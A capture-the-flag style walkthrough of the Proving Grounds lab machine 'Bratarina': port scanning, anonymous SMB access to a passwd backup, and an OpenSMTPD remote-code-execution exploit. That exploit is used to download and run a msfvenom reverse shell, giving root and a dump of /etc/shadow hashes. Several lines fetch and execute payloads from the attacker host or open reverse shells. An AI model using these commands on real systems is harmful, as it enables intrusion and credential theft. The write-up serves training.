# Bratarina

1. Nmap to enumerate ports
	1. Samba and FlaskBB likely rabbit holes
2. OpenSMTPD server running, has RCE exploit that we could use to obtain a root shell

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Mon Jan 17 07:52:15 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Bratarina/results/192.168.225.71/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Bratarina/results/192.168.225.71/scans/xml/_full_tcp_nmap.xml" 192.168.225.71
Nmap scan report for 192.168.225.71
Host is up, received user-set (0.32s latency).
Scanned at 2022-01-17 07:52:18 EST for 394s
Not shown: 65530 filtered ports
Reason: 65530 no-responses
PORT    STATE  SERVICE     REASON         VERSION
22/tcp  open   ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJ0GZmmFtQUJbj2HgPsye2Xccyyh9mC8fsCwIivM4x3o3mwZDNi6g+Y6nIs5SuOJj2IpS+E9O5wB71MSIv7d7XYrd6paprfvnvMCyAQ9VTn8py6CQ/OsgeOITU+JnAxoe3WQklpyAVqhJ7ASqAInZF8oHDaebr6gBKEq4nkoLOtJSZeB8xWDHhbQZjG6AY81Y2mHPZH/LC4gSXpSmw+3h0zhlCN/kxeyhjrsrZqIVdKhg4emds8+gQyu1Wrz4AUUBGscI6Sh5rjImr+SC4rAGgn6N0MVPcZA1mS0JUplz758Y3YFXstqO2SdaHB/Qb50fkcpclcYKibSbCv5ZLNzOf
|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOWgZAzhJ+plc4Rk/YyGvQ1KOKK9j31ix1uCWIAirjnZS/lKwcvYrkG+lVsJRBnBYVA+67ILSJR2YNVz9uZshPE=
|   256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC2Z9krPXlbEN6Xl40sc3BiVLfhbtd+l5ZFNBKkF7pYT
25/tcp  open   smtp        syn-ack ttl 63 OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.49.225], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
53/tcp  closed domain      reset ttl 63
80/tcp  open   http        syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB        
445/tcp open   netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.32 or 3.10 (88%), Linux 2.6.39 (88%), Linux 3.10 - 3.12 (88%), Synology DiskStation Manager 5.1 (87%), Linux 4.9 (87%), Linux 3.4 (87%), Linux 3.5 (87%), Linux 4.2 (87%), Linux 4.4 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/17%OT=22%CT=53%CU=%PV=Y%DS=2%DC=T%G=N%TM=61E5680C%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=110%TI=Z%II=I%TS=A)
OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 31.424 days (since Thu Dec 16 21:48:52 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m13s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 24217/tcp): CLEAN (Timeout)
|   Check 2 (port 35039/tcp): CLEAN (Timeout)
|   Check 3 (port 35554/udp): CLEAN (Timeout)
|   Check 4 (port 26627/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: bratarina
|   NetBIOS computer name: BRATARINA\x00
|   Domain name: \x00
|   FQDN: bratarina
|_  System time: 2022-01-17T07:58:12-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-17T12:58:13
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   330.87 ms 192.168.49.1
2   334.60 ms 192.168.225.71

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 17 07:58:52 2022 -- 1 IP address (1 host up) scanned in 397.64 seconds

```

## 445 - Samba

```
┌──(kali㉿kali)-[/tmp]
└─$ smbclient //192.168.225.71/backups -N 
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul  6 03:46:41 2020
  ..                                  D        0  Mon Jul  6 03:46:41 2020
  passwd.bak                          N     1747  Mon Jul  6 03:46:41 2020

                10253588 blocks of size 1024. 6351920 blocks available
smb: \> get passwd.bak
getting file \passwd.bak of size 1747 as passwd.bak (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat passwd.bak                 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
_smtpd:x:1001:1001:SMTP Daemon:/var/empty:/sbin/nologin
_smtpq:x:1002:1002:SMTPD Queue:/var/empty:/sbin/nologin
postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

# Exploit - SMTP

```
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 47984 
  Exploit: OpenSMTPD 6.6.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47984
     Path: /usr/share/exploitdb/exploits/linux/remote/47984.py
File Type: Python script, ASCII text executable

Copied to: /tmp/47984.py


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python 47984.py                  
Usage 47984.py <target ip> <target port> <command>
E.g. 47984.py 127.0.0.1 25 'touch /tmp/x'
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python 47984.py 192.168.225.71 25 whoami                                                                                                                        1 ⨯
[*] OpenSMTPD detected
[*] Connected, sending payload
Traceback (most recent call last):
  File "47984.py", line 51, in <module>
    s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
TypeError: str() takes at most 1 argument (2 given)
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 47984.py 192.168.225.71 25 whoami                                                                                                                       1 ⨯
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 47984.py 192.168.225.71 25 "/bin/bash -i >& /dev/tcp/192.168.49.225/80 0>&1"
[*] OpenSMTPD detected
[*] Connected, sending payload
[!] Error sending payload, expected 250
[!] Received: b'503 5.5.4 Invalid command arguments: Unsupported option &\r\n'
[!] Exiting...
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 47984.py 192.168.225.71 25 "wget 192.168.49.225"                                                                                                        1 ⨯
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
listening on [any] 80 ...
connect to [192.168.49.225] from (UNKNOWN) [192.168.225.71] 51710
GET / HTTP/1.1
User-Agent: Wget/1.19.4 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 192.168.49.225
Connection: Keep-Alive


```

### Reverse Shell

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 47984.py 192.168.225.71 25 "wget 192.168.49.225"                            
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 47984.py 192.168.225.71 25 "wget 192.168.49.225/shell -O /tmp/shell"
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 47984.py 192.168.225.71 25 "chmod +x /tmp/shell"
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 47984.py 192.168.225.71 25 "/tmp/shell" 
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.225 LPORT=80 -o shell -f elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of elf file: 152 bytes
Saved as: shell

┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                                                                                                                  1 ⨯
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.225.71 - - [17/Jan/2022 08:21:52] "GET / HTTP/1.1" 200 -
192.168.225.71 - - [17/Jan/2022 08:22:04] "GET /shell HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 80                
Can't grab 0.0.0.0:80 with bind : Permission denied
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
listening on [any] 80 ...
connect to [192.168.49.225] from (UNKNOWN) [192.168.225.71] 52442
whoami
root
cd /root
ls
index.html
proof.txt
cat proof.txt
8e977b14b4f9452861a3d50f58be3dba
ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.225.71  netmask 255.255.255.0  broadcast 192.168.225.255
        ether 00:50:56:bf:e7:0d  txqueuelen 1000  (Ethernet)
        RX packets 15899  bytes 1465864 (1.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15447  bytes 26182201 (26.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 45265  bytes 28328375 (28.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 45265  bytes 28328375 (28.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![](Pasted%20image%2020220117212451.png)


```
cat /etc/shadow
root:$6$F90yGgP0$M2ZsoWwUeJiH8ZkRxKnN5pRW5NBN/O9LTmhELZ3gE0DpxMu9ie53B5wMTC4mTXGYO8VGMOo6FVlGofi.AKBDf0:18449:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
lxd:*:18449:0:99999:7:::
uuidd:*:18449:0:99999:7:::
dnsmasq:*:18449:0:99999:7:::
landscape:*:18449:0:99999:7:::
sshd:*:18449:0:99999:7:::
pollinate:*:18449:0:99999:7:::
neil:$6$RvSz53R.$n9CRkIjPiSbBzVE3Qk2JFzRV5eHWebiOlBVNPj3uKYXJnRup3AVLzu0BNoH0txYXPkGdwEGo5.KW47Y0n4p5u0:18449:0:99999:7:::
_smtpd:!:18449:0:99999:7:::
_smtpq:!:18449:0:99999:7:::
postgres:*:18449:0:99999:7:::


```